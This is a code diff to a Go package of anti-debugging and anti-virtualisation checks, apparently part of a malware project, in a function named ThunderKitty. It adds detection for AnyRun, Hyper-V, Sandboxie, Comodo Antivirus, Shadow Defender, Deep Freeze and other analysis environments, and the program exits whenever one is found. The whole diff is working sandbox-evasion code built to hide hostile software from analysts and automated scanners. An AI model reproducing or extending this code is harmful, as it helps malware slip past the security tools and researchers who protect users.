@@ -3,6 +3,7 @@ package AntiDebugVMAnalysis
 import (
 	"log"
 	"os"
+
 	// AntiDebug
 	"github.com/EvilBytecode/GoDefender/AntiDebug/CheckBlacklistedWindowsNames"
 	"github.com/EvilBytecode/GoDefender/AntiDebug/InternetCheck"
@@ -10,19 +11,27 @@ import (
 	"github.com/EvilBytecode/GoDefender/AntiDebug/ParentAntiDebug"
 	"github.com/EvilBytecode/GoDefender/AntiDebug/RemoteDebugger"
 	"github.com/EvilBytecode/GoDefender/AntiDebug/RunningProcesses"
-	"github.com/EvilBytecode/GoDefender/AntiDebug/UserAntiAntiDebug"
+	HooksDetection "github.com/EvilBytecode/GoDefender/AntiDebug/UserAntiAntiDebug"
 	"github.com/EvilBytecode/GoDefender/AntiDebug/pcuptime"
+
 	// AntiVirtualization
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/AnyRunDetection"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/ComodoAntivirusDetection"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/DeepFreezeDetection"
+	HyperVCheck "github.com/EvilBytecode/GoDefender/AntiVirtualization/HyperVDetection"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/KVMCheck"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/MonitorMetrics"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/ParallelsCheck"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/RepetitiveProcess"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/SandboxieDetection"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/ShadowDefenderDetection"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/TriageDetection"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/USBCheck"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/UsernameCheck"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VMArtifacts"
+	VMPlatformCheck "github.com/EvilBytecode/GoDefender/AntiVirtualization/VMPlatformDetection"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VMWareDetection"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VirtualboxDetection"
-	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VMArtifacts"
-	"github.com/EvilBytecode/GoDefender/AntiVirtualization/RepetitiveProcess"
-	"github.com/EvilBytecode/GoDefender/AntiVirtualization/ParallelsCheck"
 )
 
 func ThunderKitty() {
@@ -64,6 +73,12 @@ func ThunderKitty() {
 		os.Exit(-1)
 	}
 
+	// Check if the AnyRun environment is detected
+	if anyRunDetected, _ := AnyRunDetection.AnyRunDetection(); anyRunDetected {
+		log.Println("[DEBUG] AnyRun detected")
+		os.Exit(-1) // Exit the program with an error code
+	}
+
 	if isScreenSmall, _ := MonitorMetrics.IsScreenSmall(); isScreenSmall {
 		log.Println("[DEBUG] Screen size is small")
 		os.Exit(-1)
@@ -80,6 +95,42 @@ func ThunderKitty() {
 
 	if pararelcheck, _ := ParallelsCheck.CheckForParallels(); pararelcheck {
 		log.Println("[DEBUG] Parallels detected. Exiting")
+		os.Exit(-1)
+	}
+
+	// Hyper-V detection
+	if hypervDetected, _ := HyperVCheck.DetectHyperV(); hypervDetected {
+		log.Println("[DEBUG] Hyper-V detected")
+		os.Exit(-1)
+	}
+
+	// VMPlatform detection
+	if vmPlatformDetected, _ := VMPlatformCheck.DetectVMPlatform(); vmPlatformDetected {
+		log.Println("[DEBUG] VM Platform detected")
+		os.Exit(-1)
+	}
+
+	// Comodo Antivirus detection
+	if comodoDetected := ComodoAntivirusDetection.DetectComodoAntivirus(); comodoDetected {
+		log.Println("[DEBUG] Comodo Antivirus detected")
+		os.Exit(-1)
+	}
+
+	// Shadow Defender detection
+	if shadowDefenderDetected := ShadowDefenderDetection.DetectShadowDefender(); shadowDefenderDetected {
+		log.Println("[DEBUG] Shadow Defender detected")
+		os.Exit(-1)
+	}
+
+	// Sandboxie detection
+	if sandboxieDetected := SandboxieDetection.DetectSandboxie(); sandboxieDetected {
+		log.Println("[DEBUG] Sandboxie detected")
+		os.Exit(-1)
+	}
+
+	// Deep Freeze detection
+	if deepFreezeDetected := DeepFreezeDetection.DetectDeepFreeze(); deepFreezeDetected {
+		log.Println("[DEBUG] Deep Freeze detected")
 		os.Exit(-1)
 	}
 
